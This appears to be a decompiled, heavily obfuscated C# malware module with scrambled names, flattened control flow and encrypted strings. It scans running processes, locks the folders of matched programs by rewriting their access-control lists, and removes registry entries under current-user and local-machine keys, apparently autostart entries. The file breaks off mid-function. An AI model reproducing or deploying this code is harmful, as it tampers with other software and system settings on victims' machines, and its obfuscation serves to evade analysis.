using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32;

public class sFpbESoZFfmXAniitjDIbZmXehqi
{
	public static int OqjMKsnTBmQqVyKGxbnfYyFyBPWF;

	public static int BDmRccMRhTjBwJzHtVyegcBDHsZK;

	public static int PPeezwwVcLWTYPKMkGpBqPFICUJt;

	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(uint uint_0, bool bool_0, int int_0);

	[DllImport("psapi.dll")]
	private static extern uint GetModuleFileNameEx(IntPtr intptr_0, IntPtr intptr_1, [Out] StringBuilder stringBuilder_0, [In][MarshalAs(UnmanagedType.U4)] int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr intptr_0);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(IntPtr intptr_0, string string_0);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool IsWindowVisible(IntPtr intptr_0);

	public static void glcjXEmkAuOFSyLiggtLKcibCYEfA()
	{
		ukwnNbAesaaSMHtTwsONmDPBiOH();
	}

	public static void ukwnNbAesaaSMHtTwsONmDPBiOH()
	{
		Process[] array = sFpbESoZFfmXAniitjDIbZmXehqi.HbFFxaEzAoYQvLaTcJWzIDdbVducA();
		int num4 = default(int);
		while (true)
		{
			int num = 1569135535;
			while (true)
			{
				int num2 = num;
				int num5;
				uint num3;
				switch ((num3 = (uint)(~(~(~(num2 + 242196200))) + -1919210271)) % 4u)
				{
				case 1u:
					goto IL_0008;
				case 2u:
					break;
				case 3u:
					if (num4 >= array.Length)
					{
						num5 = 576416768;
						goto IL_0296;
					}
					goto default;
				default:
					{
						Process process_ = array[num4];
						try
						{
							if (!sFpbESoZFfmXAniitjDIbZmXehqi.tTPMQvfMaBhVijutXflGjdgpbOIV(sFpbESoZFfmXAniitjDIbZmXehqi.KeByyORmcGONkxbwLaeWCwpOgUvKA(sFpbESoZFfmXAniitjDIbZmXehqi.UcREmVwqYuPMoJLpYhfaeohRbTZeA(process_)), sFpbESoZFfmXAniitjDIbZmXehqi.NioLLVtjTXJWTooJvixtBIknHdhX(_003CModule_003E.FIIpeorVOHrlFUhmiKCFfcGQoBWt<string>(4283915287u))))
							{
								goto IL_009c;
							}
							goto IL_0263;
							IL_0263:
							int num6;
							int num7;
							if (sFpbESoZFfmXAniitjDIbZmXehqi.cnIHCiTgipHrejKPtNVFwykZTVjE(sFpbESoZFfmXAniitjDIbZmXehqi.IEevgwdRLwmrOnwVEJPnBsaGrtIb(process_), sFpbESoZFfmXAniitjDIbZmXehqi.IEevgwdRLwmrOnwVEJPnBsaGrtIb(sFpbESoZFfmXAniitjDIbZmXehqi.mWyvXRHTvGpnmYQIFaOxNOnTWqLl())))
							{
								num6 = 455916060;
								num7 = 455916060;
							}
							else
							{
								num6 = 1996617089;
								num7 = 1996617089;
							}
							goto IL_0211;
							IL_0211:
							while (true)
							{
								num2 = num6;
								switch ((num3 = (uint)(~(~(~(num2 + 242196200))) + -1919210271)) % 9u)
								{
								case 8u:
									break;
								case 7u:
								{
									int num16;
									int num17;
									if (IsWindowVisible(sFpbESoZFfmXAniitjDIbZmXehqi.ztCTuwwfIYOzyICrXkUSwunNEEZk(process_)))
									{
										num16 = 1909390949;
										num17 = 1909390949;
									}
									else
									{
										num16 = 311718724;
										num17 = 311718724;
									}
									num6 = num16 ^ ((int)num3 * -1129481329);
									continue;
								}
								case 6u:
									rJExwALJgOaEJoqKtgidIAtzBOOGb(sFpbESoZFfmXAniitjDIbZmXehqi.IEevgwdRLwmrOnwVEJPnBsaGrtIb(process_), sFpbESoZFfmXAniitjDIbZmXehqi.KeByyORmcGONkxbwLaeWCwpOgUvKA(sFpbESoZFfmXAniitjDIbZmXehqi.UcREmVwqYuPMoJLpYhfaeohRbTZeA(process_)), sFpbESoZFfmXAniitjDIbZmXehqi.lmUYtXzqlMAUKfNEZKPiSSfYsgoJ(process_));
									num6 = ((int)num3 * -1852833499) ^ 0x6EA99839;
									continue;
								case 3u:
								{
									int num12;
									int num13;
									if (sFpbESoZFfmXAniitjDIbZmXehqi.tTPMQvfMaBhVijutXflGjdgpbOIV(sFpbESoZFfmXAniitjDIbZmXehqi.KeByyORmcGONkxbwLaeWCwpOgUvKA(sFpbESoZFfmXAniitjDIbZmXehqi.UcREmVwqYuPMoJLpYhfaeohRbTZeA(process_)), sFpbESoZFfmXAniitjDIbZmXehqi.NioLLVtjTXJWTooJvixtBIknHdhX(_003CModule_003E.lrEEJtwppfqXKpLNoovGiGLkLyOi<string>(1814053051u))))
									{
										num12 = 1389973088;
										num13 = 1389973088;
									}
									else
									{
										num12 = 1845455149;
										num13 = 1845455149;
									}
									num6 = num12 ^ (int)(num3 * 566137425);
									continue;
								}
								case 2u:
								{
									int num10;
									int num11;
									if (sFpbESoZFfmXAniitjDIbZmXehqi.tTPMQvfMaBhVijutXflGjdgpbOIV(sFpbESoZFfmXAniitjDIbZmXehqi.KeByyORmcGONkxbwLaeWCwpOgUvKA(sFpbESoZFfmXAniitjDIbZmXehqi.UcREmVwqYuPMoJLpYhfaeohRbTZeA(process_)), sFpbESoZFfmXAniitjDIbZmXehqi.NioLLVtjTXJWTooJvixtBIknHdhX(_003CModule_003E.cpdIanwVrnoZfLdwFECnwxAolslu<string>(298588928u))))
									{
										num10 = 260328022;
										num11 = 260328022;
									}
									else
									{
										num10 = 166488982;
										num11 = 166488982;
									}
									num6 = num10 ^ ((int)num3 * -848347317);
									continue;
								}
								case 1u:
								{
									int num14;
									int num15;
									if (!sFpbESoZFfmXAniitjDIbZmXehqi.tTPMQvfMaBhVijutXflGjdgpbOIV(sFpbESoZFfmXAniitjDIbZmXehqi.KeByyORmcGONkxbwLaeWCwpOgUvKA(sFpbESoZFfmXAniitjDIbZmXehqi.UcREmVwqYuPMoJLpYhfaeohRbTZeA(process_)), sFpbESoZFfmXAniitjDIbZmXehqi.NioLLVtjTXJWTooJvixtBIknHdhX(_003CModule_003E.hoNHQIKvmlteoxZbRzFVmgRmkeJN<string>(1154267296u))))
									{
										num14 = -2050638310;
										num15 = -2050638310;
									}
									else
									{
										num14 = -1808111339;
										num15 = -1808111339;
									}
									num6 = num14 ^ ((int)num3 * -91953767);
									continue;
								}
								case 0u:
								{
									int num8;
									int num9;
									if (sFpbESoZFfmXAniitjDIbZmXehqi.tTPMQvfMaBhVijutXflGjdgpbOIV(sFpbESoZFfmXAniitjDIbZmXehqi.KeByyORmcGONkxbwLaeWCwpOgUvKA(sFpbESoZFfmXAniitjDIbZmXehqi.UcREmVwqYuPMoJLpYhfaeohRbTZeA(process_)), sFpbESoZFfmXAniitjDIbZmXehqi.NioLLVtjTXJWTooJvixtBIknHdhX(_003CModule_003E.FIIpeorVOHrlFUhmiKCFfcGQoBWt<string>(4119897504u))))
									{
										num8 = -1090381881;
										num9 = -1090381881;
									}
									else
									{
										num8 = -1186794655;
										num9 = -1186794655;
									}
									num6 = num8 ^ (int)(num3 * 1688354879);
									continue;
								}
								default:
									goto end_IL_0066;
								case 4u:
									goto IL_0263;
								case 5u:
									goto end_IL_0066;
								}
								break;
							}
							goto IL_009c;
							IL_009c:
							num6 = 420126135;
							goto IL_0211;
							end_IL_0066:;
						}
						catch (Exception)
						{
						}
						num4 += _003CModule_003E.fzDahUaHxPgnWkQMrDqKcWhFgsrqc<int>(2173101411u);
						goto IL_0291;
					}
					IL_0291:
					num5 = 547561497;
					goto IL_0296;
					IL_0296:
					num2 = num5;
					switch ((num3 = (uint)(~(~(~(num2 + 242196200))) + -1919210271)) % 3u)
					{
					case 1u:
						break;
					case 0u:
						goto IL_0291;
					default:
						return;
					case 2u:
						return;
					}
					goto case 3u;
				}
				break;
				IL_0008:
				num4 = _003CModule_003E.uHWcjhhPIQpkTbHjddkymImHgeirB<int>(1152552457u);
				num = ((int)num3 * -10737472) ^ -1741480495;
			}
		}
	}

	public static void rJExwALJgOaEJoqKtgidIAtzBOOGb(string string_0, string string_1, int int_0)
	{
		if (dTTQhOLUGtYlkEFwFDbHprmMWcjo.aglmigRKIcScMwmCICSHoFlmCcon(string_0))
		{
			return;
		}
		while (true)
		{
			int num = 898639544;
			while (true)
			{
				int num2 = num;
				uint num3;
				switch ((num3 = (uint)(~(892031111 - (num2 - 533756027 + -1543596767))) ^ 0xEB0A5C63u) % 4u)
				{
				case 1u:
					IdtOlQpFKUREzdLISYlqWaLPMgOM(string_1);
					OOfiSEoCtJcFkckhIIBXDpjebzmZ(int_0);
					uzfhorsKvFnsQPesmyejCGrslZAP(string_0, string_1, int_0);
					num = (int)(num3 * 1796654362) ^ -276448081;
					continue;
				case 0u:
					PseJDNFIFYaUJgmwWUJXSyVQInKd(string_0, string_1);
					num = (int)(num3 * 1870849875) ^ -109351125;
					continue;
				default:
					return;
				case 3u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	public static void IdtOlQpFKUREzdLISYlqWaLPMgOM(string string_0)
	{
		try
		{
			string string_ = sFpbESoZFfmXAniitjDIbZmXehqi.cDjEFOpQndAXsBWrNQWLOscIbmBB((object)sFpbESoZFfmXAniitjDIbZmXehqi.DuAqIzBKMVtoWEGgiuvYedYIMfJo());
			DirectoryInfo directoryInfo_ = sFpbESoZFfmXAniitjDIbZmXehqi.IZkREcNrRZpQYoJCZpipukpjFjDf(string_0);
			DirectorySecurity directorySecurity = default(DirectorySecurity);
			while (true)
			{
				int num = 1963395052;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)(-num2 + 1182154450 - 1674174126 - 1731129933 + 857169570)) % 4u)
					{
					case 1u:
						directorySecurity = sFpbESoZFfmXAniitjDIbZmXehqi.jXoGeKCURfEsFAvpDldQGJwIiIxQA();
						num = ((int)num3 * -720859920) ^ -1119600739;
						continue;
					case 0u:
						sFpbESoZFfmXAniitjDIbZmXehqi.JFhYhhsxttURSjmamDAPEBhPGnYR((FileSystemSecurity)directorySecurity, sFpbESoZFfmXAniitjDIbZmXehqi.QoSEIPyCDmNbqDXkQstYKxBwsdyS(string_, (FileSystemRights)_003CModule_003E.PDjehoHWwjjqrxRpBRfgdvjYkkAJ<int>(748972747u), (InheritanceFlags)_003CModule_003E.fzDahUaHxPgnWkQMrDqKcWhFgsrqc<int>(864791444u), (PropagationFlags)_003CModule_003E.uHWcjhhPIQpkTbHjddkymImHgeirB<int>(1152552457u), (AccessControlType)_003CModule_003E.lrEEJtwppfqXKpLNoovGiGLkLyOi<int>(3041340891u)));
						sFpbESoZFfmXAniitjDIbZmXehqi.IlEnjPFdQsNDNgzqWajhbuNIGaQL((ObjectSecurity)directorySecurity, (byte)_003CModule_003E.PDjehoHWwjjqrxRpBRfgdvjYkkAJ<int>(1957600531u) != 0, (byte)_003CModule_003E.eSYBogRbNcXwiLHXOoNzSnstEWqn<int>(4235881942u) != 0);
						num = ((int)num3 * -1555374645) ^ -1872417654;
						continue;
					case 2u:
						break;
					default:
						sFpbESoZFfmXAniitjDIbZmXehqi.zJpqOTRAGnjaaIoAUlSpvCEjqGDs(directoryInfo_, directorySecurity);
						return;
					}
					break;
				}
			}
		}
		catch
		{
		}
	}

	public static void elbosUpbWhEuKDNfwIEzmQGlJSfm(string string_0)
	{
		try
		{
			DirectorySecurity directorySecurity = default(DirectorySecurity);
			string string_ = default(string);
			DirectoryInfo directoryInfo_ = default(DirectoryInfo);
			while (true)
			{
				int num = 1295666923;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)((991516456 - (~num2 ^ -978287487)) * 1979669179 - 632896741)) % 8u)
					{
					case 7u:
						directorySecurity = sFpbESoZFfmXAniitjDIbZmXehqi.jXoGeKCURfEsFAvpDldQGJwIiIxQA();
						num = (int)(num3 * 1107153968) ^ -982478052;
						continue;
					case 5u:
						sFpbESoZFfmXAniitjDIbZmXehqi.JFhYhhsxttURSjmamDAPEBhPGnYR((FileSystemSecurity)directorySecurity, sFpbESoZFfmXAniitjDIbZmXehqi.QoSEIPyCDmNbqDXkQstYKxBwsdyS(string_, (FileSystemRights)_003CModule_003E.fzDahUaHxPgnWkQMrDqKcWhFgsrqc<int>(3609223278u), (InheritanceFlags)_003CModule_003E.lrEEJtwppfqXKpLNoovGiGLkLyOi<int>(4090111232u), (PropagationFlags)_003CModule_003E.FsXfCOdVPfuECkuSQtBwrUiNuCjv<int>(1727844003u), (AccessControlType)_003CModule_003E.fzDahUaHxPgnWkQMrDqKcWhFgsrqc<int>(4058481327u)));
						sFpbESoZFfmXAniitjDIbZmXehqi.JFhYhhsxttURSjmamDAPEBhPGnYR((FileSystemSecurity)directorySecurity, sFpbESoZFfmXAniitjDIbZmXehqi.QoSEIPyCDmNbqDXkQstYKxBwsdyS(string_, (FileSystemRights)_003CModule_003E.FsXfCOdVPfuECkuSQtBwrUiNuCjv<int>(769018829u), (InheritanceFlags)_003CModule_003E.XTSDPIkelZRmCDtxqjwvfsFQKEKm<int>(29741502u), (PropagationFlags)_003CModule_003E.caNKiBPreIKCeUBrFUJYAHCfqyTI<int>(437828032u), (AccessControlType)_003CModule_003E.XTSDPIkelZRmCDtxqjwvfsFQKEKm<int>(3250767049u)));
						sFpbESoZFfmXAniitjDIbZmXehqi.JFhYhhsxttURSjmamDAPEBhPGnYR((FileSystemSecurity)directorySecurity, sFpbESoZFfmXAniitjDIbZmXehqi.QoSEIPyCDmNbqDXkQstYKxBwsdyS(string_, (FileSystemRights)_003CModule_003E.FIIpeorVOHrlFUhmiKCFfcGQoBWt<int>(2444898624u), (InheritanceFlags)_003CModule_003E.LVBdOaJrpZkwOnxQkSmDUuOVUGAm<int>(1345458064u), (PropagationFlags)_003CModule_003E.cUuIhZvgJGeBkfBqJIoCsmqMdLmx<int>(314796093u), (AccessControlType)_003CModule_003E.XTSDPIkelZRmCDtxqjwvfsFQKEKm<int>(1442317677u)));
						sFpbESoZFfmXAniitjDIbZmXehqi.JFhYhhsxttURSjmamDAPEBhPGnYR((FileSystemSecurity)directorySecurity, sFpbESoZFfmXAniitjDIbZmXehqi.QoSEIPyCDmNbqDXkQstYKxBwsdyS(string_, (FileSystemRights)_003CModule_003E.cUuIhZvgJGeBkfBqJIoCsmqMdLmx<int>(3257883982u), (InheritanceFlags)_003CModule_003E.fzDahUaHxPgnWkQMrDqKcWhFgsrqc<int>(864791444u), (PropagationFlags)_003CModule_003E.cpdIanwVrnoZfLdwFECnwxAolslu<int>(1155502918u), (AccessControlType)_003CModule_003E.FsXfCOdVPfuECkuSQtBwrUiNuCjv<int>(3524537071u)));
						sFpbESoZFfmXAniitjDIbZmXehqi.JFhYhhsxttURSjmamDAPEBhPGnYR((FileSystemSecurity)directorySecurity, sFpbESoZFfmXAniitjDIbZmXehqi.QoSEIPyCDmNbqDXkQstYKxBwsdyS(string_, (FileSystemRights)_003CModule_003E.cUuIhZvgJGeBkfBqJIoCsmqMdLmx<int>(3656571701u), (InheritanceFlags)_003CModule_003E.cpdIanwVrnoZfLdwFECnwxAolslu<int>(1849185913u), (PropagationFlags)_003CModule_003E.FsXfCOdVPfuECkuSQtBwrUiNuCjv<int>(1727844003u), (AccessControlType)_003CModule_003E.fzDahUaHxPgnWkQMrDqKcWhFgsrqc<int>(2173101411u)));
						num = ((int)num3 * -1912914183) ^ 0x4FA49178;
						continue;
					case 4u:
						string_ = sFpbESoZFfmXAniitjDIbZmXehqi.cDjEFOpQndAXsBWrNQWLOscIbmBB((object)sFpbESoZFfmXAniitjDIbZmXehqi.DuAqIzBKMVtoWEGgiuvYedYIMfJo());
						num = (int)((num3 * 1326889794) ^ 0x5E3CED76);
						continue;
					case 3u:
						directoryInfo_ = sFpbESoZFfmXAniitjDIbZmXehqi.IZkREcNrRZpQYoJCZpipukpjFjDf(string_0);
						num = ((int)num3 * -15852531) ^ 0x52197475;
						continue;
					case 2u:
						sFpbESoZFfmXAniitjDIbZmXehqi.JFhYhhsxttURSjmamDAPEBhPGnYR((FileSystemSecurity)directorySecurity, sFpbESoZFfmXAniitjDIbZmXehqi.QoSEIPyCDmNbqDXkQstYKxBwsdyS(string_, (FileSystemRights)_003CModule_003E.UZgcyOqfJkCFZCqyceZDDyPAEuIMB<int>(2581528116u), (InheritanceFlags)_003CModule_003E.lrEEJtwppfqXKpLNoovGiGLkLyOi<int>(4090111232u), (PropagationFlags)_003CModule_003E.lrEEJtwppfqXKpLNoovGiGLkLyOi<int>(3041340891u), (AccessControlType)_003CModule_003E.fzDahUaHxPgnWkQMrDqKcWhFgsrqc<int>(2173101411u)));
						sFpbESoZFfmXAniitjDIbZmXehqi.JFhYhhsxttURSjmamDAPEBhPGnYR((FileSystemSecurity)directorySecurity, sFpbESoZFfmXAniitjDIbZmXehqi.QoSEIPyCDmNbqDXkQstYKxBwsdyS(string_, (FileSystemRights)_003CModule_003E.LVBdOaJrpZkwOnxQkSmDUuOVUGAm<int>(494588474u), (InheritanceFlags)_003CModule_003E.uHWcjhhPIQpkTbHjddkymImHgeirB<int>(3690856016u), (PropagationFlags)_003CModule_003E.UZgcyOqfJkCFZCqyceZDDyPAEuIMB<int>(2321665813u), (AccessControlType)_003CModule_003E.eSYBogRbNcXwiLHXOoNzSnstEWqn<int>(459518034u)));
						sFpbESoZFfmXAniitjDIbZmXehqi.JFhYhhsxttURSjmamDAPEBhPGnYR((FileSystemSecurity)directorySecurity, sFpbESoZFfmXAniitjDIbZmXehqi.QoSEIPyCDmNbqDXkQstYKxBwsdyS(string_, (FileSystemRights)_003CModule_003E.FsXfCOdVPfuECkuSQtBwrUiNuCjv<int>(1539144859u), (InheritanceFlags)_003CModule_003E.caNKiBPreIKCeUBrFUJYAHCfqyTI<int>(3552497265u), (PropagationFlags)_003CModule_003E.cpdIanwVrnoZfLdwFECnwxAolslu<int>(1155502918u), (AccessControlType)_003CModule_003E.cUuIhZvgJGeBkfBqJIoCsmqMdLmx<int>(854839377u)));
						sFpbESoZFfmXAniitjDIbZmXehqi.JFhYhhsxttURSjmamDAPEBhPGnYR((FileSystemSecurity)directorySecurity, sFpbESoZFfmXAniitjDIbZmXehqi.QoSEIPyCDmNbqDXkQstYKxBwsdyS(string_, (FileSystemRights)_003CModule_003E.hoNHQIKvmlteoxZbRzFVmgRmkeJN<int>(1047173114u), (InheritanceFlags)_003CModule_003E.hoNHQIKvmlteoxZbRzFVmgRmkeJN<int>(674009151u), (PropagationFlags)_003CModule_003E.cpdIanwVrnoZfLdwFECnwxAolslu<int>(1155502918u), (AccessControlType)_003CModule_003E.hoNHQIKvmlteoxZbRzFVmgRmkeJN<int>(696500974u)));
						sFpbESoZFfmXAniitjDIbZmXehqi.IlEnjPFdQsNDNgzqWajhbuNIGaQL((ObjectSecurity)directorySecurity, (byte)_003CModule_003E.FIIpeorVOHrlFUhmiKCFfcGQoBWt<int>(485427698u) != 0, (byte)_003CModule_003E.lrEEJtwppfqXKpLNoovGiGLkLyOi<int>(1668481415u) != 0);
						num = (int)((num3 * 1526348979) ^ 0x412823AE);
						continue;
					case 1u:
						sFpbESoZFfmXAniitjDIbZmXehqi.zJpqOTRAGnjaaIoAUlSpvCEjqGDs(directoryInfo_, directorySecurity);
						num = ((int)num3 * -785648344) ^ 0x3A5411E1;
						continue;
					default:
						return;
					case 0u:
						break;
					case 6u:
						return;
					}
					break;
				}
			}
		}
		catch
		{
		}
	}

	public static void PseJDNFIFYaUJgmwWUJXSyVQInKd(string string_0, string string_1)
	{
		try
		{
			RegistryKey registryKey_ = sFpbESoZFfmXAniitjDIbZmXehqi.FQzpcosMLYJIQcaxWKALCLBWSSgx(Registry.CurrentUser, _003CModule_003E.uHWcjhhPIQpkTbHjddkymImHgeirB<string>(4077060675u));
			string text = default(string);
			string[] array = default(string[]);
			int num6 = default(int);
			while (true)
			{
				IL_01c5:
				int num = 277450769;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)((1378051871 - ((num2 + -1876099878) ^ 0x43E9CAB ^ 0x4140F3FC)) * 2069975131)) % 12u)
					{
					case 11u:
						text = array[num6];
						num = -18708440;
						continue;
					case 10u:
						KQKMLqvGajKjfOnrndyNIKPMjScK(_003CModule_003E.ZIEesMDEqZiukGRraWRbhCtueSxd<string>(372438369u), _003CModule_003E.hoNHQIKvmlteoxZbRzFVmgRmkeJN<string>(1067365680u), text);
						num = ((int)num3 * -882780018) ^ 0x1F58AB47;
						continue;
					case 9u:
						array = sFpbESoZFfmXAniitjDIbZmXehqi.wWdBefCMNkpegLZoanMnrUuchiUC(registryKey_);
						num = ((int)num3 * -875130156) ^ 0x2FDC05AA;
						continue;
					case 8u:
						num = ((int)num3 * -882773979) ^ 0x443DFEF;
						continue;
					case 7u:
						OqjMKsnTBmQqVyKGxbnfYyFyBPWF += _003CModule_003E.LVBdOaJrpZkwOnxQkSmDUuOVUGAm<int>(3528035793u);
						num = (int)((num3 * 277201665) ^ 0x77AB3F76);
						continue;
					case 6u:
					{
						int num8;
						int num9;
						if (!sFpbESoZFfmXAniitjDIbZmXehqi.tTPMQvfMaBhVijutXflGjdgpbOIV(sFpbESoZFfmXAniitjDIbZmXehqi.cDjEFOpQndAXsBWrNQWLOscIbmBB(sFpbESoZFfmXAniitjDIbZmXehqi.KvntHawRTLkvkwfHAZCRBpRToNIQ(registryKey_, text)), string_0))
						{
							num8 = 845175531;
							num9 = 845175531;
						}
						else
						{
							num8 = -1353207808;
							num9 = -1353207808;
						}
						num = num8 ^ ((int)num3 * -144044617);
						continue;
					}
					case 4u:
						num6 = _003CModule_003E.ZIEesMDEqZiukGRraWRbhCtueSxd<int>(3826195875u);
						num = (int)(num3 * 1485272705) ^ -299519682;
						continue;
					case 3u:
					{
						int num7;
						if (num6 < array.Length)
						{
							num = -2096755661;
							num7 = -2096755661;
						}
						else
						{
							num = 1650974912;
							num7 = 1650974912;
						}
						continue;
					}
					case 1u:
						num6 += _003CModule_003E.cUuIhZvgJGeBkfBqJIoCsmqMdLmx<int>(854839377u);
						num = -1893303793;
						continue;
					case 0u:
					{
						int num4;
						int num5;
						if (sFpbESoZFfmXAniitjDIbZmXehqi.cnIHCiTgipHrejKPtNVFwykZTVjE(text, JTsqAjmpcDQcqmNvmrpMImhsbOcu.XzFOKgaAfTrVgucTHFxbWaqRKfLJ))
						{
							num4 = -1132083788;
							num5 = -1132083788;
						}
						else
						{
							num4 = 213171601;
							num5 = 213171601;
						}
						num = num4 ^ ((int)num3 * -1029879454);
						continue;
					}
					default:
						goto end_IL_0166;
					case 5u:
						break;
					case 2u:
						goto end_IL_0166;
					}
					goto IL_01c5;
					continue;
					end_IL_0166:
					break;
				}
				break;
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey_2 = sFpbESoZFfmXAniitjDIbZmXehqi.FQzpcosMLYJIQcaxWKALCLBWSSgx(Registry.CurrentUser, _003CModule_003E.caNKiBPreIKCeUBrFUJYAHCfqyTI<string>(1573986956u));
			string text2 = default(string);
			int num11 = default(int);
			string[] array2 = default(string[]);
			while (true)
			{
				IL_0365:
				int num10 = -1325240297;
				while (true)
				{
					int num2 = num10;
					uint num3;
					switch ((num3 = (uint)((1378051871 - ((num2 + -1876099878) ^ 0x43E9CAB ^ 0x4140F3FC)) * 2069975131)) % 10u)
					{
					case 9u:
					{
						int num15;
						int num16;
						if (!sFpbESoZFfmXAniitjDIbZmXehqi.cnIHCiTgipHrejKPtNVFwykZTVjE(text2, JTsqAjmpcDQcqmNvmrpMImhsbOcu.XzFOKgaAfTrVgucTHFxbWaqRKfLJ))
						{
							num15 = -576144539;
							num16 = -576144539;
						}
						else
						{
							num15 = 563097290;
							num16 = 563097290;
						}
						num10 = num15 ^ (int)(num3 * 723381880);
						continue;
					}
					case 8u:
					{
						int num13;
						int num14;
						if (sFpbESoZFfmXAniitjDIbZmXehqi.tTPMQvfMaBhVijutXflGjdgpbOIV(sFpbESoZFfmXAniitjDIbZmXehqi.cDjEFOpQndAXsBWrNQWLOscIbmBB(sFpbESoZFfmXAniitjDIbZmXehqi.KvntHawRTLkvkwfHAZCRBpRToNIQ(registryKey_2, text2)), string_1))
						{
							num13 = 775173237;
							num14 = 775173237;
						}
						else
						{
							num13 = 1477272465;
							num14 = 1477272465;
						}
						num10 = num13 ^ ((int)num3 * -204829546);
						continue;
					}
					case 7u:
						num11 += _003CModule_003E.UZgcyOqfJkCFZCqyceZDDyPAEuIMB<int>(1641638193u);
						num10 = 1073887796;
						continue;
					case 6u:
						KQKMLqvGajKjfOnrndyNIKPMjScK(_003CModule_003E.ZIEesMDEqZiukGRraWRbhCtueSxd<string>(372438369u), _003CModule_003E.eSYBogRbNcXwiLHXOoNzSnstEWqn<string>(3073873122u), text2);
						num10 = ((int)num3 * -113826721) ^ 0x54AEF5C3;
						continue;
					case 5u:
						OqjMKsnTBmQqVyKGxbnfYyFyBPWF += _003CModule_003E.eSYBogRbNcXwiLHXOoNzSnstEWqn<int>(459518034u);
						num10 = ((int)num3 * -714466228) ^ -747733191;
						continue;
					case 2u:
						text2 = array2[num11];
						num10 = -1560181020;
						continue;
					case 1u:
						array2 = sFpbESoZFfmXAniitjDIbZmXehqi.wWdBefCMNkpegLZoanMnrUuchiUC(registryKey_2);
						num11 = _003CModule_003E.PDjehoHWwjjqrxRpBRfgdvjYkkAJ<int>(2373668063u);
						num10 = (int)(num3 * 894993450) ^ -319619510;
						continue;
					case 0u:
					{
						int num12;
						if (num11 >= array2.Length)
						{
							num10 = -609454673;
							num12 = -609454673;
						}
						else
						{
							num10 = 1106970386;
							num12 = 1106970386;
						}
						continue;
					}
					default:
						goto end_IL_030e;
					case 4u:
						break;
					case 3u:
						goto end_IL_030e;
					}
					goto IL_0365;
					continue;
					end_IL_030e:
					break;
				}
				break;
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey_3 = sFpbESoZFfmXAniitjDIbZmXehqi.FQzpcosMLYJIQcaxWKALCLBWSSgx(Registry.LocalMachine, _003CModule_003E.LVBdOaJrpZkwOnxQkSmDUuOVUGAm<string>(463190495u));
			string[] array3 = sFpbESoZFfmXAniitjDIbZmXehqi.wWdBefCMNkpegLZoanMnrUuchiUC(registryKey_3);
			string text3 = default(string);
			int num20 = default(int);
			while (true)
			{
				IL_050c:
				int num17 = 364052945;
				while (true)
				{
					int num2 = num17;
					uint num3;
					switch ((num3 = (uint)((1378051871 - ((num2 + -1876099878) ^ 0x43E9CAB ^ 0x4140F3FC)) * 2069975131)) % 10u)
					{
					case 9u:
						OqjMKsnTBmQqVyKGxbnfYyFyBPWF += _003CModule_003E.lrEEJtwppfqXKpLNoovGiGLkLyOi<int>(1668481415u);
						num17 = (int)(num3 * 1029322171) ^ -668759004;
						continue;
					case 8u:
						KQKMLqvGajKjfOnrndyNIKPMjScK(_003CModule_003E.lrEEJtwppfqXKpLNoovGiGLkLyOi<string>(3873342265u), _003CModule_003E.eSYBogRbNcXwiLHXOoNzSnstEWqn<string>(1748913788u), text3);
						num17 = ((int)num3 * -509350580) ^ 0x19E716E7;
						continue;
					case 6u:
					{
						text3 = array3[num20];
						int num21;
						if (sFpbESoZFfmXAniitjDIbZmXehqi.tTPMQvfMaBhVijutXflGjdgpbOIV(sFpbESoZFfmXAniitjDIbZmXehqi.cDjEFOpQndAXsBWrNQWLOscIbmBB(sFpbESoZFfmXAniitjDIbZmXehqi.KvntHawRTLkvkwfHAZCRBpRToNIQ(registryKey_3, text3)), string_1))
						{
							num17 = 1282599982;
							num21 = 1282599982;
						}
						else
						{
							num17 = -1901452659;
							num21 = -1901452659;
						}
						continue;
					}
					case 5u:
						num20 += _003CModule_003E.PDjehoHWwjjqrxRpBRfgdvjYkkAJ<int>(1957600531u);
						num17 = -1408038208;
						continue;
					case 4u:
					{
						int num22;
						if (num20 < array3.Length)
						{
							num17 = -787310840;
							num22 = -787310840;
						}
						else
						{
							num17 = -2029004297;
							num22 = -2029004297;
						}
						continue;
					}
					case 3u:
						num20 = _003CModule_003E.XTSDPIkelZRmCDtxqjwvfsFQKEKm<int>(3250767049u);
						num17 = ((int)num3 * -2131585996) ^ -40378906;
						continue;
					case 2u:
						num17 = ((int)num3 * -798659788) ^ 0x479A0EB0;
						continue;
					case 0u:
					{
						int num18;
						int num19;
						if (sFpbESoZFfmXAniitjDIbZmXehqi.cnIHCiTgipHrejKPtNVFwykZTVjE(text3, JTsqAjmpcDQcqmNvmrpMImhsbOcu.XzFOKgaAfTrVgucTHFxbWaqRKfLJ))
						{
							num18 = 184091212;
							num19 = 184091212;
						}
						else
						{
							num18 = -1658866931;
							num19 = -1658866931;
						}
						num17 = num18 ^ (int)(num3 * 304018150);
						continue;
					}
					default:
						goto end_IL_04b5;
					case 7u:
						break;
					case 1u:
						goto end_IL_04b5;
					}
					goto IL_050c;
					continue;
					end_IL_04b5:
					break;
				}
				break;
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey_4 = sFpbESoZFfmXAniitjDIbZmXehqi.FQzpcosMLYJIQcaxWKALCLBWSSgx(Registry.LocalMachine, _003CModule_003E.cUuIhZvgJGeBkfBqJIoCsmqMdLmx<string>(4190270241u));
			string[] array4 = default(string[]);
			int num24 = default(int);
			string text4 = default(string);
			while (true)
			{
				int num23 = 149972033;
				while (true)
				{
					int num2 = num23;
					uint num3;
					switch ((num3 = (uint)((1378051871 - ((num2 + -1876099878) ^ 0x43E9CAB ^ 0x4140F3FC)) * 2069975131)) % 9u)
					{
					case 8u:
						array4 = sFpbESoZFfmXAniitjDIbZmXehqi.wWdBefCMNkpegLZoanMnrUuchiUC(registryKey_4);
